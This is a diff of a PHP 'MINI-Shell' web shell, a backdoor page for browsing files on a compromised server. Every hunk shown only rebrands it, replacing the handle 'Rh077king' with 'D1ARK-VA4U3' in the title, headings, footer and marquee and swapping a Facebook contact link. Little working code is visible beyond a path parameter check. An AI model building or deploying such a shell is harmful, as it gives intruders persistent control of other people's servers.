@@ -11,7 +11,7 @@ echo '<!DOCTYPE HTML>
 <html>
 <head>
 <link href="" rel="stylesheet" type="text/css">
-<title>Rh077king MINI-Shell</title>
+<title>D1ARK-VA4U3 MINI-Shell</title>
 <style>
 body{
 font-family: "Racing Sans One", cursive;
@@ -45,7 +45,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="red">Rh077king mini shell</font></center></h1>
+<h1><center><font color="red">D1ARK-VA4U3 mini shell</font></center></h1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="blue">Path :</font> ';
 if(isset($_GET['path'])){
@@ -238,7 +238,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/> Rh077king </center>
+echo '<center><br/> D1ARK-VA4U3 </center>
 </body>
 </html>';
 function perms($file){
@@ -297,8 +297,8 @@ return $info;
 <center>
 <br>
 
-<marquee><h1> Rh077king  </h1></marquee>
+<marquee><h1> D1ARK-VA4U3  </h1></marquee>
 <p style="color:blue;">
-All Rights <a href="https://www.facebook.com/Rh.king.W.h.h.C.k.s/"> contact:-Rh077king</a>
+All Rights <a href="https://www.facebook.com/dark.vau.its.official"> contact:-Rh077king</a>
 </p>
 </center>
